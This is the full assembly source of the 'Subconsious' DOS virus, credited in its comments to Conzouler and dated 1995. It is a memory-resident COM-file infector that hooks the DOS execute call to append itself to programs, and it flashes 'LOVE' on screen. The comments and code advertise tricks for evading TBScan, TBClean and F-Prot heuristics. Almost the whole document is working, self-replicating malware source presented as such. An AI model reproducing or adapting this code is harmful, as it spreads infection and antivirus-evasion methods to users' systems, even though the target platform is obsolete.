;
;  Subconsious virus, written by Conzouler 1995.
;
;  This virus is based on RSV.208.
;
;  Effect:
;  Flashes a text on line 4 on the screen.
;  The text is drawn once on the screen with
;  raster beam syncronisation. The after-
;  glow can make the text visible for a longer
;  period, especially when using black back-
;  ground.
;
;  Features:
;  memory resident
;  com-append on execute
;  no tb-flags (of course)
;  no f-prot heuristics
;  untbcleanable
;  no destructive routines
;  no stealth
;

.model tiny
.code
 org 100h

psize   equ     (offset last - offset entry) / 10h + 7
size    equ     offset last - offset entry

entry:
        db      0e9h,0,0            ;Initial jump
start:
        call    gores
delta   equ     $
oentry  db      0CDh,20h,90h

gores:
        mov     ax, 4277h           ; Installation check
        int     21h
        jnc     restore

        mov     ah, 4Ah             ; Get size of memory block
        mov     bx, 0FFFFh
        int     21h
        mov     ah, 4Ah             ; Change size of memory
        sub     bx, psize+1         ; Make space for virus
        int     21h
        mov     ah, 48h             ; Allocate memory
        mov     bx, psize
        int     21h
        sub     ax, 10h             ; Compensate org 100h
        mov     es, ax
        mov     di, 103h
        mov     si, sp              ; Get entry point
        mov     si, [si]
        sub     si, 3               ; Subtract first call
        mov     cx, size-3
        rep     movsb               ; Copy virus to new memory
        push    es
        pop     ds
        inc     byte ptr ds:[0F1h]  ; Mark owner of memory
        mov     ax, 3508h           ; Get interrupt vector
        int     21h
        mov     i08o, bx
        mov     i08s, es
        mov     ah, 25h             ; Set interrupt vector
        mov     dx, offset vec08
        int     21h
        mov     ax, 3521h           ; Get interrupt vector
        int     21h
        mov     i21o, bx
        mov     i21s, es
        mov     ah, 25h             ; Set interrupt vector
        mov     dx, offset vec21
        int     21h
restore:
        mov     di, 100h
        push    cs                  ; Set es and ds to psp
        pop     ds
        jmp     next                ; Clear prefetch queue
        
db      'Subconsious virus - Conzouler/IR 1995.'

next:   pop     si                  ; Get entry point
        mov     byte ptr ds:si[offset debug+1-delta], 0; Fool tbclean
debug:  jmp     nodebug
        int     20h
nodebug:
        push    ds
        pop     es
        push    di                  ; Save it
        movsw                       ; Restore program entry point
        movsb
        retn                        ; Jump to 100h

        db      '  Mina tankar „r det sista som ni tar...  '

vec08:
        pushf
        push    ax
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        xor     ax, ax               ; Get timer
        mov     ds, ax
        mov     al, ds:[46Ch]
        and     al, 7Fh              ; See if time to show
        or      al, al
        jnz     v08x

        cld

        mov     ax, 0B800h           ; Video memory
        mov     ds, ax
        push    cs
        pop     es

        mov     si, (80*4+20)*2      ; Centre text on line 4
        mov     di, offset last
        mov     cx, subsize
        rep     movsw                ; Save original

        mov     dx, 3DAh             ; Raster port
vbl:    in      al, dx               ; Wait for vertical retrace
        test    al, 8
        jnz     vbl
vbl2:   in      al, dx
        test    al, 8
        jz      vbl2

        mov     cx, subsize          ; Put message on screen
        mov     si, offset msg
        mov     di, (80*4+20)*2
        push    ds
        push    es
        pop     ds
        pop     es
disp:   movsb
        inc     di
        loop    disp

vbl3:   in      al, dx               ; Wait for retrace to end
        test    al, 8
        jnz     vbl3

        mov     cx, 5*16             ; Wait until 5 lines have
hbl:    in      al, dx               ; been read from video mem
        test    al, 1
        jz      hbl
hbl2:   in      al, dx
        test    al, 1
        jnz     hbl2
        loop    hbl

        mov     cx, subsize          ; Restore original screen
        mov     di, (80*4+20)*2
        mov     si, offset last
        rep     movsw

v08x:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     ax
        popf

        db      0EAh
i08o    dw      ?
i08s    dw      ?

msg     db      'LOVE LOVE LOVE LOVE LOVE LOVE LOVE LOVE'
subsize equ     $-offset msg


vec21:
        cmp     ax, 4277h            ; Installation check
        jne     v21e
        iret

v21e:   cmp     ax, 4B00h            ; Execute program
        jne     v21x

        push    ax                   ; Infect file
        push    bx
        push    cx
        push    dx
        push    ds

        mov     ax, 3D82h            ; Open file
        int     21h
        xchg    ax, bx               ; Put handle in bx

        push    cs                   ; Read first bytes
        pop     ds                   ; to oentry
        mov     ah, 3Fh
        mov     dx, offset oentry
        mov     cx, 3
        int     21h
        cmp     byte ptr oentry, 'M'  ; Check if exe file
        je      infectx
        push    cx

        mov     ax, 4202h            ; Seek to eof
        xor     cx, cx
        cwd                          ; Zero dx
        int     21h
        sub     ax, 3                ; Get offset to eof
        mov     word ptr entry[1], ax    ; Save as jump
        xchg    dx, ax
        mov     ax, 4200h
        int     21h
        mov     ah, 3Fh              ; Infection check
        mov     dx, offset last
        pop     cx
        int     21h
        cmp     byte ptr last[2], 0EAh  ; Check if infected
        je      infectx

        mov     byte ptr entry, 0E9h    ; Create jump opcode

        mov     ah, 3Fh              ; Append virus
        inc     ah                   ; Fool TBScan
        push    ax
        mov     dx, 103h
        mov     cx, size-7
        int     21h

        mov     ax, 4200h            ; Insert jump
        xor     cx, cx
        cwd
        int     21h

        pop     ax
        mov     dh, 1h               ; 100h in dx
        mov     cl, 3                ; 3 in cx
        int     21h
infectx:
        mov     ah, 3Eh
        int     21h

        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax

v21x:   db      0EAh                 ; Jump to dos vector
i21o    dw      ?
i21s    dw      ?
last:
end     entry
